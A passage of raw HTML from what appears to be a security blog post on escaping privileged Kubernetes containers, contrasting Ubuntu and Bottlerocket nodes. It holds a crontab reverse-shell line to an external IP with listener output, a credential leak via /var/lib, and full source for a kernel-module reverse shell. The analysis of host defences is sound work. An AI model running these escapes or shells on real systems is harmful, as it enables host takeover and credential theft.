</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>|-nvme0n1p15 259:3    0   99M  0 part
</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>`-nvme0n1p16 259:4    0  923M  0 part
</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>nvme1n1      259:1    0   20G  0 disk
</span></code></pre></div></p>
</li>
<li>
<p>mount the host's underyling partition, using its retrieved device name:
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>root@app-priv-ubuntu:/# mount /dev/nvme0n1p1 /mnt
</span></code></pre></div></p>
</li>
<li>
<p>access the host's entire filesystem via the <code>/mnt</code> directory:
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>root@app-priv-ubuntu:/# ls -la /mnt
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>total 104
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>drwxr-xr-x 23 root root  4096 Oct 15 04:29 .
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>drwxr-xr-x  1 root root  4096 Oct 15 04:29 ..
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>lrwxrwxrwx  1 root root     7 Apr 22  2024 bin -&gt; usr/bin
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>drwxr-xr-x  2 root root  4096 Feb 26  2024 bin.usr-is-merged
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>drwxr-xr-x  2 root root  4096 Oct  1 12:43 boot
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>drwxr-xr-x  4 root root  4096 Oct  1 12:34 dev
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>drwxr-xr-x 83 root root  4096 Oct 15 04:35 etc
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>drwxr-xr-x  4 root root  4096 Oct 15 04:35 home
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>drwxr-xr-x  3 root root  4096 Oct 15 04:29 host
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>lrwxrwxrwx  1 root root     7 Apr 22  2024 lib -&gt; usr/lib
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>drwxr-xr-x  2 root root  4096 Feb 26  2024 lib.usr-is-merged
</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>drwx------  2 root root 16384 Oct  1 12:42 lost+found
</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>drwxr-xr-x  2 root root  4096 Oct  1 12:34 media
</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>drwxr-xr-x  2 root root  4096 Oct  1 12:34 mnt
</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>drwxr-xr-x  5 root root  4096 Oct 15 04:29 opt
</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>drwxr-xr-x  2 root root  4096 Apr 22  2024 proc
</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>drwx------  5 root root  4096 Oct 15 04:29 root
</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>drwxr-xr-x  5 root root  4096 Oct  1 12:54 run
</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a>lrwxrwxrwx  1 root root     8 Apr 22  2024 sbin -&gt; usr/sbin
</span><span id="__span-12-22"><a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a>drwxr-xr-x  2 root root  4096 Jul 10 14:46 sbin.usr-is-merged
</span><span id="__span-12-23"><a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a>drwxr-xr-x 11 root root  4096 Oct  1 12:54 snap
</span><span id="__span-12-24"><a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a>drwxr-xr-x  2 root root  4096 Oct  1 12:34 srv
</span><span id="__span-12-25"><a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a>drwxr-xr-x  2 root root  4096 Apr 22  2024 sys
</span><span id="__span-12-26"><a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a>drwxrwxrwt 10 root root  4096 Oct 15 04:37 tmp
</span><span id="__span-12-27"><a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a>drwxr-xr-x 11 root root  4096 Oct  1 12:34 usr
</span><span id="__span-12-28"><a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a>drwxr-xr-x 13 root root  4096 Oct 15 04:28 var
</span></code></pre></div></p>
</li>
</ol>
<p>There are many potential pathways forward from this point. If the host was running ssh, an attacker could pivot to that by reading or modifying the <code>/etc/passwd</code> and <code>/etc/shadow</code> files. This would allow them to retrieve encrypted user passwords for offline cracking, change existing passwords and even add completely new users. Another option would be to insert a new ssh key directly into a user's <code>~/.ssh/authorized_keys</code> file, allowing them to login without knowing the user's existing password. If <code>cron</code> happened to be running on the host, a basic reverse shell that calls out every minute could also be added to the <code>/etc/crontab</code> file, like so:
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>echo &quot;* * * * * root /bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/15.230.15.77/4444 0&gt;&amp;1&#39;&quot; &gt;&gt; /mnt/etc/crontab
</span></code></pre></div></p>
<p>As soon as the <code>cron</code> daemon reloads, a root-level shell will be caught by the waiting listener, providing the attacker with shell access to the node ðŸ’€
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>[ec2-user@ip-10-240-150-240 ~]$ nc -lvnp 4444
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Ncat: Version 7.93 ( https://nmap.org/ncat )
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Ncat: Listening on :::4444
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>Ncat: Listening on 0.0.0.0:4444
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>Ncat: Connection from 10.248.2.145.
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>Ncat: Connection from 10.248.2.145:42052.
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>bash: cannot set terminal process group (13006): Inappropriate ioctl for device
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>bash: no job control in this shell
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>root@ip-10-248-2-145:~# whoami
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>whoami
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>root
</span></code></pre></div></p>
<p>What happens when we move to a Bottlerocket node? To start with, <code>lsblk</code> shows us a somewhat different looking list of devices available:
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>root@app-priv-bottlerocket:/# lsblk
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>NAME         MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>nvme0n1      259:0    0    4G  0 disk
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>|-nvme0n1p1  259:2    0    4M  0 part
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>|-nvme0n1p2  259:3    0    5M  0 part
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>|-nvme0n1p3  259:4    0   40M  0 part
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>|-nvme0n1p4  259:5    0  920M  0 part
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>|-nvme0n1p5  259:6    0   10M  0 part
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>|-nvme0n1p6  259:7    0   25M  0 part
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>|-nvme0n1p7  259:8    0    5M  0 part
</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>|-nvme0n1p8  259:9    0   40M  0 part
</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>|-nvme0n1p9  259:10   0  920M  0 part
</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>|-nvme0n1p10 259:11   0   10M  0 part
</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>|-nvme0n1p11 259:12   0   25M  0 part
</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>|-nvme0n1p12 259:13   0   41M  0 part
</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>`-nvme0n1p13 259:14   0    1M  0 part
</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>nvme1n1      259:1    0   20G  0 disk
</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>`-nvme1n1p1  259:16   0   20G  0 part /etc/resolv.conf
</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>                                      /etc/hostname
</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>                                      /dev/termination-log
</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>                                      /etc/hosts
</span></code></pre></div></p>
<p>What's going on here? As mentioned earlier, Bottlerocket implements a dual-partition, immutable root filesystem approach:</p>
<ol>
<li>a comparatively small read-only <strong>root filesystem</strong> available at <code>/dev/nvme0n1p1</code></li>
<li>a typically larger <strong>data partition</strong> available at <code>/dev/nvme1n1p1</code>, intended to store persistent data and container state</li>
</ol>
<p>Attempting to mount the root filesystem is no longer possible:
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>root@app-priv-bottlerocket:/# mount /dev/nvme0n1p1 /mnt
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>mount: /mnt: wrong fs type, bad option, bad superblock on /dev/nvme0n1p1, missing codepage or helper program, or other error.
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>       dmesg(1) may have more information after failed mount system call.
</span></code></pre></div></p>
<p>The <code>dmesg</code> output confirms this is the case:
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>[ 4521.901135] erofs: (device nvme0n1p1): erofs_read_superblock: cannot find valid erofs superblock
</span></code></pre></div></p>
<p>Bottlerocket protects this partition using <code>dm-verity</code>, a kernel feature designed to verify the integrity of read-only partitions. In addition to blocking any attempts to modify the filesystem, the way it is mounted to the node also prevents the partition from being re-mounted into the container, even if it happens to be running in privileged mode.</p>
<p>This protection doesn't extend to the data partition however, which can still be mounted from the container:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>root@app-priv-bottlerocket:/# mount /dev/nvme1n1p1 /mnt
</span></code></pre></div>
<p>But when we list the contents of the drive, the results aren't quite what might be expected:
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>root@app-priv-bottlerocket:/# ls -la /mnt
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>total 0
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>drwxr-xr-x. 7 root root 90 Oct 15 04:40 .
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>drwxr-xr-x. 1 root root 28 Oct 15 04:41 ..
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>drwx------. 2 root root  6 Oct 15 04:40 bootstrap-containers
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>drwx------. 4 root root 34 Oct 15 04:40 host-containers
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>drwxr-xr-x. 2 root root  6 Oct 15 04:40 mnt
</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>drwxr-xr-x. 4 root root 53 Oct 15 04:40 opt
</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>drwxr-xr-x. 7 root root 88 Oct 15 04:40 var
</span></code></pre></div></p>
<p>As well as running with dual partitions, Bottlerocket also maintains two separate container runtimes:</p>
<ol>
<li>the <code>host container</code> runtime, which supports the privileged <code>control</code> and <code>admin</code> containers, intended to manage the host</li>
<li>the <code>application container</code> runtime, which supports containers deployed via kubernetes</li>
</ol>
<p>The data partition exists primarily to support the host container runtime, indicated by the presence of the <code>/host-containers</code> directory. Due to the need for running services such as <code>kubelet</code> and <code>containerd</code>, it also indirectly supports the application container runtime. To be fair, the <code>/var/lib</code> directory could provide sensitive information related to other containers executing alongside our privileged container, which an attacker would no doubt be interested in. For example, assuming an adjacent container was running with a poorly configured credential, provided via a simple environment variable:
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>- name: PASSWORD
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>  value: supersecret
</span></code></pre></div></p>
<p>That container could have its credential leaked, through various container runtime configuration files found in <code>/var/lib</code>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>root@app-priv-bottlerocket:/mnt# grep -ri supersecret ./* 2&gt;/dev/null
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>./var/lib/cni/results/cni-loopback-bb027bf6a87deee6b0f1f4a19efc6e84978f9258e08f08d0e50e772e6518d851-lo:{&quot;kind&quot;:&quot;cniCacheV1&quot;,&quot;containerId&quot;:&quot;bb027bf6a87deee6b0f1f4a19efc6e84978f9258e08f08d0e50e772e6518d851&quot;,&quot;config&quot;:&quot;ewoiY25pVmVyc2lvbiI6ICIwLjMuMSIsCiJuYW1lIjogImNuaS1sb29wYmFjayIsCiJwbHVnaW5zIjogW3sKICAidHlwZSI6ICJsb29wYmFjayIKfV0KfQ==&quot;...&quot;kubectl.kubernetes.io/last-applied-configuration&quot;:&quot;{\&quot;apiVersion\&quot;:\&quot;v1\&quot;,\&quot;kind\&quot;:\&quot;Pod\&quot;,\&quot;metadata\&quot;:{\&quot;annotations\&quot;:{},\&quot;name\&quot;:\&quot;reg-pod-bottlerocket-host\&quot;,\&quot;namespace\&quot;:\&quot;default\&quot;},\&quot;spec\&quot;:{\&quot;containers\&quot;:[{\&quot;command\&quot;:[\&quot;tail\&quot;,\&quot;-f\&quot;,\&quot;/dev/null\&quot;],\&quot;env\&quot;:[{\&quot;name\&quot;:\&quot;PASSWORD\&quot;,\&quot;value\&quot;:\&quot;supersecret\&quot;}],\&quot;image\&quot;:\&quot;ubuntu:latest\&quot;,\&quot;name\&quot;:\&quot;ubuntu\&quot;}],\&quot;nodeSelector\&quot;:{\&quot;nodepool\&quot;:\&quot;arm-bottlerocket\&quot;}...
</span></code></pre></div></p>
<p>In terms of looking for ways to gain shell access to the node however, Bottlerocket's dual-partition approach limits our options:</p>
<ul>
<li>there is no direct access to sensitive system files like we had on the Ubuntu host (<code>/etc/*</code>, users' <code>~/.ssh/authorized_keys</code> etc)</li>
<li>some of these system files do still exist, but accessing them requires first entering the <em>admin container</em>, before using <code>sheltie</code> to transition the working context to the host, which finally provides access to the host's filesystem</li>
</ul>
<p>Browsing the files that we <em>do</em> have access to, you may feel a shiver of hope when viewing the contents of <code>/host-containers/admin/user-data</code>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>root@app-priv-bottlerocket:/# cat /mnt/host-containers/admin/user-data
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>{&quot;ssh&quot;:{&quot;authorized-keys&quot;:[]}}
</span></code></pre></div></p>
<p>Like other EC2s, Bottlerocket supports provisioning user-data for bootstrapping. What makes it different, however, is the way that this user-data is applied. The file in question is actually mounted into the <code>admin</code> container on startup, rather than being applied to the host. At first glance it may appear that our write access to this file could provide a way of adding an ssh key to the admin container, and while the file is actually editable from the privileged container, modifying it has no effect. This is because changing the admin container's behaviour requires execution of the native <em>Bottlerocket API</em>, which remains out of reach without shell access to the host.</p>
<p>In summary, Bottlerocket's dual-partition setup prevents us from getting anywhere near the meaningful files of the host's filesystem, and its read-only setup means that even if we could, it wouldn't prove very useful anyway ðŸš€</p>
<h2 id="technique-3-loading-a-custom-kernel-module">Technique 3: Loading a Custom Kernel Module</h2>
<p>The final container escape technique evaluated involves the loading of a malicious, custom kernel module, initiated from within the privileged container but ultimately impacting the host. There is a common misconception that traditional container runtimes provide a strong security boundary between containers, when in reality they're all just processes running on the host (projects such as <a href="https://katacontainers.io/">Kata Containers</a> are seeking to address this). The only operating system kernel at work is usually the one belonging to the host, which it shares with the running containers, meaning any code executed inside those containers is actually executed on the host. Again, this kind of attack is only possible due to the container being launched in privilege mode, which provides it with the <code>CAP_SYS_MODULE</code> capability.</p>
<p>To execute the attack, a compatible kernel module that contains the payload needs to be prepared for the container. This can be compiled directly in the container if the required tools are available, or it can be prepared elsewhere and copied over. <a href="https://www.rbtsec.com/blog/kubernetes-penetration-testing-part-three-breaking-out-with-privileged-containers/">RBT Security</a> have a great blog post oulining the process, including sample source code for the module:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a># Makefile
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>obj-m += k8s-lkm-reverse-shell.o
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>KDIR := /lib/modules/$(shell uname -r)/build
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>PWD  := $(shell pwd)
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>all:
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>    $(MAKE) -C $(KDIR) M=$(PWD) modules
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>clean:
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>    $(MAKE) -C $(KDIR) M=$(PWD) clean
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>// k8s-lkm-reverse-shell.c
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>#include &lt;linux/module.h&gt;
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>#include &lt;linux/kernel.h&gt;
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>#include &lt;linux/init.h&gt;
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>#include &lt;linux/kmod.h&gt;
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>#include &lt;linux/workqueue.h&gt;
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>#include &lt;linux/slab.h&gt;
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>#define REVERSE_SHELL_CMD \
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>    &quot;bash -i &gt;&amp; /dev/tcp/15.230.15.77/4444 0&gt;&amp;1&quot;
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>/* Will hold our dynamically-allocated command string */
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>static char *cmd_buf;
</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>/* argv and envp for call_usermodehelper */
</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>static char *argv_local[4];
</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>static char *envp_local[] = {
</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>    &quot;HOME=/&quot;,
</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>    NULL
</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>};
</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>/* Work item to defer our userspace call */
</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>static DECLARE_WORK(cb_work, NULL);
</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>/* Work handler - runs in process context, outside of module init */
</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>static void cb_work_handler(struct work_struct *work)
</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>{
</span><span id="__span-24-23"><a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>    pr_info(&quot;cb_work_handler: launching reverse shell\n&quot;);
</span><span id="__span-24-24"><a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a>    call_usermodehelper(argv_local[0], argv_local, envp_local, UMH_NO_WAIT);
</span><span id="__span-24-25"><a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a>}
</span><span id="__span-24-26"><a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a>static int __init connect_back_init(void)
</span><span id="__span-24-27"><a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a>{
</span><span id="__span-24-28"><a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a>    /* 1) Allocate &amp; copy the command into kernel memory */
</span><span id="__span-24-29"><a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a>    cmd_buf = kmalloc(strlen(REVERSE_SHELL_CMD) + 1, GFP_KERNEL);
</span><span id="__span-24-30"><a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a>    if (!cmd_buf)
</span><span id="__span-24-31"><a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a>        return -ENOMEM;
</span><span id="__span-24-32"><a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a>    strcpy(cmd_buf, REVERSE_SHELL_CMD);
</span><span id="__span-24-33"><a id="__codelineno-24-33" name="__codelineno-24-33" href="#__codelineno-24-33"></a>    /* 2) Populate argv */
</span><span id="__span-24-34"><a id="__codelineno-24-34" name="__codelineno-24-34" href="#__codelineno-24-34"></a>    argv_local[0] = &quot;/bin/bash&quot;;
</span><span id="__span-24-35"><a id="__codelineno-24-35" name="__codelineno-24-35" href="#__codelineno-24-35"></a>    argv_local[1] = &quot;-c&quot;;
</span><span id="__span-24-36"><a id="__codelineno-24-36" name="__codelineno-24-36" href="#__codelineno-24-36"></a>    argv_local[2] = cmd_buf;
</span><span id="__span-24-37"><a id="__codelineno-24-37" name="__codelineno-24-37" href="#__codelineno-24-37"></a>    argv_local[3] = NULL;
</span><span id="__span-24-38"><a id="__codelineno-24-38" name="__codelineno-24-38" href="#__codelineno-24-38"></a>    /* 3) Initialize and schedule our work item */
</span><span id="__span-24-39"><a id="__codelineno-24-39" name="__codelineno-24-39" href="#__codelineno-24-39"></a>    INIT_WORK(&amp;cb_work, cb_work_handler);
</span><span id="__span-24-40"><a id="__codelineno-24-40" name="__codelineno-24-40" href="#__codelineno-24-40"></a>    schedule_work(&amp;cb_work);
</span><span id="__span-24-41"><a id="__codelineno-24-41" name="__codelineno-24-41" href="#__codelineno-24-41"></a>    pr_info(&quot;connect_back: module loaded, work scheduled\n&quot;);
</span><span id="__span-24-42"><a id="__codelineno-24-42" name="__codelineno-24-42" href="#__codelineno-24-42"></a>    return 0;
</span><span id="__span-24-43"><a id="__codelineno-24-43" name="__codelineno-24-43" href="#__codelineno-24-43"></a>}
</span><span id="__span-24-44"><a id="__codelineno-24-44" name="__codelineno-24-44" href="#__codelineno-24-44"></a>static void __exit connect_back_exit(void)
</span><span id="__span-24-45"><a id="__codelineno-24-45" name="__codelineno-24-45" href="#__codelineno-24-45"></a>{
</span><span id="__span-24-46"><a id="__codelineno-24-46" name="__codelineno-24-46" href="#__codelineno-24-46"></a>    /* Ensure any pending work has finished */
</span><span id="__span-24-47"><a id="__codelineno-24-47" name="__codelineno-24-47" href="#__codelineno-24-47"></a>    flush_work(&amp;cb_work);
</span><span id="__span-24-48"><a id="__codelineno-24-48" name="__codelineno-24-48" href="#__codelineno-24-48"></a>    /* Free our command buffer */
</span><span id="__span-24-49"><a id="__codelineno-24-49" name="__codelineno-24-49" href="#__codelineno-24-49"></a>    kfree(cmd_buf);
</span><span id="__span-24-50"><a id="__codelineno-24-50" name="__codelineno-24-50" href="#__codelineno-24-50"></a>    pr_info(&quot;connect_back: module exiting\n&quot;);
</span><span id="__span-24-51"><a id="__codelineno-24-51" name="__codelineno-24-51" href="#__codelineno-24-51"></a>}
</span><span id="__span-24-52"><a id="__codelineno-24-52" name="__codelineno-24-52" href="#__codelineno-24-52"></a>module_init(connect_back_init);
</span><span id="__span-24-53"><a id="__codelineno-24-53" name="__codelineno-24-53" href="#__codelineno-24-53"></a>module_exit(connect_back_exit);
</span><span id="__span-24-54"><a id="__codelineno-24-54" name="__codelineno-24-54" href="#__codelineno-24-54"></a>MODULE_LICENSE(&quot;GPL&quot;);
</span><span id="__span-24-55"><a id="__codelineno-24-55" name="__codelineno-24-55" href="#__codelineno-24-55"></a>MODULE_AUTHOR(&quot;RBT Security&quot;);
</span><span id="__span-24-56"><a id="__codelineno-24-56" name="__codelineno-24-56" href="#__codelineno-24-56"></a>MODULE_DESCRIPTION(&quot;Deferred reverseâ€shell via privileged container escape PoC&quot;);
